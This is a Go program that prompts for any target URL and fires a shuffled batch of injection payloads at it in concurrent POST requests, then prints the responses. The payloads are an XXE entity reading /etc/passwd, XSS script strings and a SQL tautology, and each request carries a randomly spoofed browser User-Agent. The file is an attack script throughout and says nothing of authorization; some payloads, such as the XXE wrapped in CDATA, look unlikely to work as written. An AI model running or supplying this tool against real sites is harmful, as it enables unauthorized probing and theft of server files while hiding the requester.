package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {
	// Prompt the user to enter the target website URL
	fmt.Print("Enter your target website url: ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	url := scanner.Text()

	// Replace "application/xml" with the appropriate content type if needed
	// For XML injection, the content type is typically "application/xml" or "text/xml"
	contentType := "application/xml"

	// List of embedded XML payloads
	payloads := []string{
		"<inject>This is a test</inject>",
		"<inject>' OR '1'='1</inject>",
		"<inject><!--<script>alert('XSS');</script>--></inject>",
		"<inject><![CDATA[<script>alert('XSS');</script>]]></inject>",
		"<inject><![CDATA[<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>]]></inject>",
		"<inject>&lt;/inject&gt;&lt;inject&gt;This is a test&lt;/inject&gt;",
		"<inject>&lt;inject&gt;&lt;![CDATA[This is a test]]&gt;&lt;/inject&gt;",
		"<inject>&lt;!--This is a test--&gt;",
		// Add more payloads as needed
	}

	// Use WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup
	wg.Add(len(payloads))

	// Channel to receive results from goroutines
	results := make(chan string, len(payloads))

	// Randomize the order of payloads
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(payloads), func(i, j int) {
		payloads[i], payloads[j] = payloads[j], payloads[i]
	})

	// Send requests concurrently with different payloads
	for _, payload := range payloads {
		go func(payload string) {
			defer wg.Done()

			// Make a POST request with the payload
			client := &http.Client{}
			req, err := http.NewRequest("POST", url, strings.NewReader(payload))
			if err != nil {
				results <- fmt.Sprintf("Error creating request: %v", err)
				return
			}
			req.Header.Set("Content-Type", contentType)
			req.Header.Set("User-Agent", getRandomUserAgent()) // Spoof User-Agent header

			resp, err := client.Do(req)
			if err != nil {
				results <- fmt.Sprintf("Error making request: %v", err)
				return
			}
			defer resp.Body.Close()

			// Read the response body
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				results <- fmt.Sprintf("Error reading response: %v", err)
				return
			}

			// Check if the response body contains any sensitive information or error messages
			// Here you can implement logic to check for specific patterns indicating successful injection
			result := fmt.Sprintf("Payload: %s\nResponse Body: %s", payload, string(body))
			results <- result
		}(payload)
	}

	// Close the channel after all goroutines have finished
	go func() {
		wg.Wait()
		close(results)
	}()

	// Print results from the channel
	for result := range results {
		fmt.Println(result)
	}
}

func init() {
	// Set timeout for HTTP requests
	http.DefaultClient.Timeout = 10 * time.Second
}

func getRandomUserAgent() string {
	// List of user agents to choose from
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:86.0) Gecko/20100101 Firefox/86.0",
	}
	// Randomly select a user agent from the list
	return userAgents[rand.Intn(len(userAgents))]
}
